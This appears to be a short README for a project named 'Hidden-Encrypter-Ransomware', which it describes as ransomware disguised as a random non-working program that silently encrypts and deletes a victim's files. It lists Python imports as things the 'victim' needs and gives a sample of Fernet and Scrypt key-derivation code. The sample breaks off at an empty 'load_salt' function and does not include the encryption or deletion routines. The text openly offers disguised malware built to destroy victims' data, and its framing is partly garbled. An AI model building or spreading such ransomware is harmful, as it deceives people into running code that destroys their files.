# Hidden-Encrypter-Ransomware
A ransomware that doesn't make any gui asking for money, it just looks like a random non-working program, little do they know, it encrypts and deletes the files.

Make sure that the victm has at least one of these: 
import pathlib,
import secrets,
import os,
import base64,
import getpass,
import cryptography

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
def generate_salt(size=16):
    """Generate the salt used for key derivation, 
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)
def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())
def load_salt():

style of code (sample ^)
